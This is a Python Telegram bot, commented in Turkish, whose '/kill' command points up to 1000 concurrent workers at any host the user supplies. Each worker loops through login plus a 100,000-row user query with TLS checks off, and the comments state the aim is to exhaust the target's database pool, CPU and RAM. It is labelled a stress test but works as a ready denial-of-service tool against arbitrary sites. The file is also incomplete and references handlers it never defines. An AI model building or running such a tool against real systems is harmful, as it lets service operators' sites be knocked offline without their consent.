import os
import asyncio
import aiohttp
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

TOKEN = os.getenv("BOT_TOKEN")
active_tests = {}

async def login_and_burn(session, base_url, username, password):
    """DB bağlantısı + CPU + RAM aynı anda"""
    
    # 1. LOGIN - DB bağlantısı + şifre hash (CPU)
    try:
        login_data = {'username': username, 'password': password}
        async with session.post(
            f"{base_url}/api/admin/token",
            data=login_data,
            timeout=aiohttp.ClientTimeout(total=5),
            ssl=False
        ) as resp:
            if resp.status == 200:
                result = await resp.json()
                token = result.get('access_token')
            else:
                return None
    except:
        return None
    
    # 2. AĞIR SORGU - Büyük veri (RAM + CPU + DB)
    headers = {'Authorization': f'Bearer {token}'}
    
    try:
        # Büyük limit ile kullanıcı listesi
        async with session.get(
            f"{base_url}/api/users?limit=100000",
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=10),
            ssl=False
        ) as resp:
            body = await resp.read()  # Tüm veri RAM'e
            return len(body)
    except:
        return None

async def burn_worker(session, base_url, username, password, end_time, results):
    """Sürekli login + ağır sorgu"""
    while time.time() < end_time:
        try:
            size = await login_and_burn(session, base_url, username, password)
            if size:
                results['success'] += 1
                results['bytes'] += size
            else:
                results['failed'] += 1
        except:
            results['failed'] += 1
        
        # Minimum bekleme - maksimum yük
        await asyncio.sleep(0.01)

async def run_kill_test(base_url, username, password, threads, duration):
    """En ölümcül test"""
    
    results = {
        'success': 0,
        'failed': 0,
        'bytes': 0,
        'start_time': time.time()
    }
    
    # Çok bağlantı - DB havuzunu doldur
    connector = aiohttp.TCPConnector(
        limit=threads * 10,
        limit_per_host=threads * 5,
        ttl_dns_cache=300,
        use_dns_cache=True,
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        end_time = time.time() + duration
        
        # Tüm thread'leri aynı anda başlat
        tasks = []
        for i in range(threads):
            task = asyncio.create_task(
                burn_worker(session, base_url, username, password, end_time, results)
            )
            tasks.append(task)
            
            # Hızlı ramp-up
            if i < threads - 1:
                await asyncio.sleep(0.1)  # 100ms'de bir
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    elapsed = time.time() - results['start_time']
    return results, elapsed

async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """En ağır test - DB + CPU + RAM"""
    chat_id = update.effective_chat.id
    
    if active_tests.get(chat_id):
        await update.message.reply_text("⏳ Zaten test çalışıyor!")
        return
    
    args = context.args
    if len(args) < 4:
        await update.message.reply_text(
            "❌ Kullanım:\n"
            "`/kill site.com:port /endpoint kullanici sifre [thread] [sure]`\n\n"
            "Örnek:\n"
            "`/kill vipsecure.dev:448 /api/users admin pass 200 60`",
            parse_mode='Markdown'
        )
        return
    
    host_port = args[0]
    username = args[2]
    password = args[3]
    threads = min(int(args[4]) if len(args) > 4 else 100, 1000)
    duration = min(int(args[5]) if len(args) > 5 else 30, 120)
    
    if ':' in host_port:
        host, port = host_port.split(':')
        base_url = f"https://{host}:{port}"
    else:
        base_url = f"https://{host_port}"
    
    active_tests[chat_id] = True
    
    msg = await update.message.reply_text(
        f"💀 **KILL SWITCH TEST**\n\n"
        f"🌐 `{base_url}`\n"
        f"👤 `{username}`\n"
        f"🔥 Thread: {threads}\n"
        f"⏱️ Süre: {duration}s\n\n"
        f"⚠️ DB + CPU + RAM aynı anda!\n"
        f"⏳ Başlıyor...",
        parse_mode='Markdown'
    )
    
    try:
        results, elapsed = await run_kill_test(base_url, username, password, threads, duration)
        
        rps = round((results['success'] + results['failed']) / elapsed, 2) if elapsed > 0 else 0
        mb = round(results['bytes'] / (1024*1024), 2)
        
        report = (
            f"💀 **KILL SWITCH SONUÇLARI**\n\n"
            f"🌐 `{base_url}`\n"
            f"⏱️ Süre: {round(elapsed, 1)} sn\n"
            f"🚀 RPS: {rps}\n"
            f"📦 Veri: {mb} MB\n\n"
            f"📈 **İstatistikler**\n"
            f"├ ✅ Başarılı: {results['success']}\n"
            f"├ ❌ Başarısız: {results['failed']}\n"
            f"├ 📉 Hata: %{round(results['failed']/(results['success']+results['failed'])*100, 2) if (results['success']+results['failed']) > 0 else 0}\n\n"
            f"⚠️ Bu test DB bağlantı + CPU + RAM zorladı!"
        )
        
        await msg.edit_text(report, parse_mode='Markdown')
        
    except Exception as e:
        await msg.edit_text(f"❌ Hata: {str(e)[:200]}")
    finally:
        active_tests[chat_id] = False

# ... diğer handler'lar aynı ...

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("test", test_command))
    app.add_handler(CommandHandler("api", api_command))
    app.add_handler(CommandHandler("kill", kill_command))  # Yeni komut
    
    print("🤖 Bot v6 - Kill Switch aktif")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
            
